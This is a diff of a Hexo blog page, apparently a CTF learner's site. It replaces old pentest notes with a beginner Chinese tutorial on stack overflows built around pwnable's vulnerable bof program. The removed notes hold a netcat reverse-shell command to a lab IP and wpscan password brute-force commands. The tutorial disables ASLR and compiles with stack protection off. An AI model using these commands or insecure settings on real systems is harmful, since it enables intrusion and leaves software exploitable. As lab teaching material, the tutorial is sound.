@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>安全知识杂项3 | Hexo</title>
-  <meta name="keywords" content=" 杂项 ">
-  <meta name="description" content="安全知识杂项3 | Hexo">
+  <title>pwn | Hexo</title>
+  <meta name="keywords" content=" CTF ">
+  <meta name="description" content="pwn | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="前置基础知识了解目前pwn 大多针对c语言（因为c语言比较古老）c语言执行过程：  首先是c语言源代码经过编译编程汇编代码 汇编代码再经过汇编变成目标文件 目标文件通过动态&#x2F;静态连接 成为可执行文件（linux-&gt;elf，windows-&gt;exe）  c语言作为编译型语言，pyhton作为解释型语言，相比来说c语言执行速度更快 并且汇编代码&lt;–&gt;机器码 可以映射">
 <meta property="og:type" content="article">
@@ -709,9 +709,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-安全知识杂项3" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-pwn" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">安全知识杂项3</h1>
+        <h1 class="article-title">pwn</h1>
     
     <div class="article-meta">
         
@@ -721,7 +721,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="杂项">杂项</a>
+            <a  data-rel="CTF">CTF</a>
             
         </span>
         
@@ -729,14 +729,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">杂项</a>
+            <a class="color4">CTF</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2024-03-15 10:35:32'>2024-03-14 20:23</time>
+            Created At : <time class="date" title='Updated At: 2024-08-14 16:16:33'>2024-08-13 09:26</time>
         
     </div>
     <div class="article-meta">
@@ -758,7 +758,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3"><span class="toc-text">前置基础知识了解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-text">pwn-栈溢出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AE"><span class="toc-text">2.1 环境设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E7%BC%96%E8%AF%91%E6%BA%90%E6%96%87%E4%BB%B6"><span class="toc-text">2.2 编译源文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-bof%E7%A8%8B%E5%BA%8F"><span class="toc-text">3.1 bof程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E6%A0%88%E7%BB%93%E6%9E%84"><span class="toc-text">3.2 寄存器与栈结构</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -774,14 +774,67 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>sudo 提权涉及到的命令<br>kali字典位置<br>wpscan 爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:// --passwords /usr/share/wordlists/rockyou.txt --usernames admin</span><br></pre></td></tr></table></figure>
+        <hr>
+<h2 id="前置基础知识了解"><a href="#前置基础知识了解" class="headerlink" title="前置基础知识了解"></a>前置基础知识了解</h2><p>目前pwn 大多针对c语言（因为c语言比较古老）c语言执行过程：</p>
+<p><img src="/2024/08/13/pwn/1.png" alt="1"></p>
+<p>首先是c语言源代码经过编译编程<strong>汇编代码</strong> 汇编代码再经过汇编变成<strong>目标文件</strong> 目标文件通过动态&#x2F;静态连接 成为<strong>可执行文件</strong>（linux-&gt;elf，windows-&gt;exe）</p>
+<p><img src="/2024/08/13/pwn/2.png" alt="2"></p>
+<p>c语言作为编译型语言，pyhton作为解释型语言，相比来说c语言执行速度更快</p>
+<p>并且汇编代码&lt;–&gt;机器码 可以映射  即反汇编很容易</p>
+<p>但是汇编代码 转为c语言源代码不是映射的，因此反汇编很难</p>
+<p>Elf 文件在磁盘与内存中的比较</p>
+<p><img src="/2024/08/13/pwn/3.png" alt="3"></p>
+<p>查看磁盘信息（hex） objdump -s elf</p>
+<p>查看进程信息（hex） gdb  vmmap</p>
+<p><img src="/2024/08/13/pwn/4.png" alt="4"></p>
+<p><img src="/2024/08/13/pwn/5.png" alt="5"></p>
+<p><img src="/2024/08/13/pwn/6.png" alt="6"></p>
+<h3 id="pwn-栈溢出"><a href="#pwn-栈溢出" class="headerlink" title="pwn-栈溢出"></a>pwn-栈溢出</h3><p><img src="/2024/08/13/pwn/7.png" alt="7"></p>
+<p><img src="/2024/08/13/pwn/8.png" alt="8"> 	</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> str[<span class="number">8</span>];</span><br><span class="line">  read(<span class="number">0</span>,str,<span class="number">20</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这是一个标准的缓冲区溢出，因为在read函数中从str数组中读取了20字节长度的数据</span></span><br></pre></td></tr></table></figure>
 
-<p>sh 反弹shellecho”nohup nc -e &#x2F;bin&#x2F;sh 192.168.1.7 4444&amp;” &gt; custom_check_mem<br>lua 提权<br>python逃逸沙箱机制<br>&#x2F;smbclient  连接smb服务<br>wpscan 工具使用wpscan –disable-tls-checks –url <a target="_blank" rel="noopener" href="http://www.midwest.htb/">http://www.midwest.htb/</a>  -U admin -P &#x2F;home&#x2F;enyo&#x2F;wordlist.txt<br>爆破</p>
-<p>joomscan使用<br>ssrf 漏洞利用工具<br>存活主机扫描<br>zip 密码爆破frackzip</p>
-<p>sudo -l提权   与    root用户可执行文件提权在sudo -l 成功提权但是并不能拥有实际root权限时<br><img src="/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B93/1693927525612-2bb08c84-454f-49a0-bff8-032f6a51192f.png" alt="image.png"></p>
-<p><img src="/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B93/1693976199749-926cf3af-ef11-427c-95b9-37655b8eeeaf.png" alt="image.png"></p>
-<p>输出终端<br>import  pty<br>pry.spawn(“&#x2F;bin&#x2F;bash”)</p>
+
+
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p>本篇会从PWN的HelloWorld——栈溢出漏洞开始，进行新手教程，由于我也是刚学习，所以理解上也是从新手的角度出发的，一些理解不到位的地方，恳请各位大神指正，我会及时修订。 </p>
+<p>教程需要对c语言和汇编有一些基本理解，但是一上来就讲一堆c基础和汇编基础确实太枯燥了很容易昏昏欲睡，所以教程采用例题引入问题，分析过程中遇到问题穿插对应知识点的方式进行说明，这也是作者自己学习过程中采用的方法。</p>
+<h3 id="2-1-环境设置"><a href="#2-1-环境设置" class="headerlink" title="2.1 环境设置"></a><strong>2.1 环境设置</strong></h3><p>为了降低入门难度，会关闭操作系统的地址空间随机化（ASLR），这是针对栈溢出漏洞被操作系统广泛采用的防御措施。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 注意，下面是临时修改方案，系统重启后会被重置为2echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-编译源文件"><a href="#2-2-编译源文件" class="headerlink" title="2.2 编译源文件"></a><strong>2.2 编译源文件</strong></h3><p>在实验环境创建.c源代码文件，使用如下命令进行编译。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc-4.8 -g -m32 -O0 -fno-stack-protector -z execstack -o [可执行文件名] [源文件名]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>知识点-编译参数说明</p>
+<ol>
+<li>-m32：使用32位编译</li>
+<li>-O0：关闭所有优化</li>
+<li>-g：在可执行文件中加入源码信息</li>
+<li>-fno-stack-protector：关闭栈保护</li>
+<li>-z execstack：启用栈上代码可执行</li>
+</ol>
+<h2 id><a href="#" class="headerlink" title></a></h2><p>​                                                                              <strong>三、栈溢出HelloWorld</strong></p>
+<h3 id="3-1-bof程序"><a href="#3-1-bof程序" class="headerlink" title="3.1 bof程序"></a><strong>3.1 bof程序</strong></h3><p>我们来看这样一段程序，来自PWN著名站点pwnable的经典程序bof，下载下来代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(overflowme);    <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们先简单读一下这段代码，main函数中调用了func函数，但参数为0xdeadbeef，func函数中定义了一个char overflowme[32]的32位字符数组，调用gets函数获取用户的输入，如果key参数是0xcafebabe，则返回shell。</p>
+<p>可以看到我们的目的就是想办法使得参数key等于0xcafebabe，这样就能get shell，但是key在main函数调用时写死了，有什么办法可以改动吗？</p>
+<p>注意这句gets(overflowme);，会将我们输入的内容填入overflowme字符数组，如果填入超过32位的定义长度，就会发生栈溢出。</p>
+<p>使用如下命令进行编译：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc-4.8 -g -m32 -O0 -fno-stack-protector -z execstack -o bof_32-gcc4.8 bof.c</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注：本题pwnable官网是打开了栈保护和栈不可执行（通过checksec可以查看），但是我们本地环境编译时是关闭的，会造成栈偏离量略有不同，但思路是相同的。</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="3-2-寄存器与栈结构"><a href="#3-2-寄存器与栈结构" class="headerlink" title="3.2 寄存器与栈结构"></a><strong>3.2 寄存器与栈结构</strong></h3><p><strong>寄存器</strong></p>
+<p>函数状态主要涉及三个寄存器－－esp，ebp，eip。</p>
+<ol>
+<li>esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</li>
+<li>ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</li>
+<li>eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</li>
+</ol>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1514900020@qq.com </span>
